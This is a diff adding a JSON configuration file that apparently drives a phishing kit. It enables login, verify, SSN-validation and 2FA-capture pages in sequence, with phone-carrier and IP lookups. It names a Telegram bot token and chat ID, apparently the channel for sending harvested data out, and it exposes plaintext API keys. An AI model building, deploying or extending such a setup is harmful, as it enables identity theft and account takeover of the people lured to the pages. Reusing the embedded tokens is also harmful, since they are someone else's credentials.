@@ -1,0 +1,44 @@
+{
+    "telegram": {
+        "bot_token": "8778478401:AAEkqoF0ws2vebwMBthNtEwKeOLAIiyE0Nk",
+        "chat_id": "8299743680"
+    },
+    "abstract": {
+        "phone_intelligence": {
+            "api_key": "0adc8e15f7914654b2c102cebbb299a0"
+        },
+        "ip_intelligence": {
+            "api_key": "d0b97b7a3ac0416e99894597ea731efe"
+        },
+        "timezones": {
+            "api_key": "2a134f00316b40d38682a7f0d7251a5a"
+        }
+    },
+    "pages": [
+        {
+            "id": "login",
+            "enabled": true,
+            "order": 1
+        },
+        {
+            "id": "verify",
+            "enabled": true,
+            "order": 2
+        },
+        {
+            "id": "secure",
+            "enabled": true,
+            "order": 3,
+            "features": {
+                "ssn_validation": true,
+                "phone_carrier_detection": true
+            }
+        },
+        {
+            "id": "2fa",
+            "enabled": true,
+            "order": 4
+        }
+    ]
+}
+
